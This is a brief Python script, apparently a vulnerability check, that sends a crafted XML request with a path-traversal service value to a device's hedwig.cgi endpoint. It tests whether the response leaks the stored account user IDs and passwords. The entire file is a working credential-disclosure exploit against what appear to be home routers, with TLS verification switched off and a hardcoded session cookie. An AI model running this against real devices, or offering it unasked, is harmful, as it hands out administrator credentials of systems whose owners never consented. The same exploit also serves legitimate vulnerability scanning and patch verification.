import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"hedwig.cgi"
	body='<?xml version="1.0" encoding="utf-8"?><postxml><module><service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service></module></postxml>'
	headers={'Content-Type': 'text/xml', 'Cookie': 'uid=R8tBjwtFc8'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	reditList = response.history
	if len(reditList)>0:
		f_list=[]
		for response in reditList:
			if response.status_code == 200 and "xml" in response.headers["Content-Type"] and "</usrid>" in response.text and "</password>" in response.text and "<result>OK</result>" in response.text:
				f_list.append(1)
		if len(f_list)==1:
			r0=True
		else:
			r0=False
	else:
		if response.status_code == 200 and "xml" in response.headers["Content-Type"] and "</usrid>" in response.text and "</password>" in response.text and "<result>OK</result>" in response.text:
			r0=True
		else:
			r0=False
	if r0:
		return True
	else:
		return False
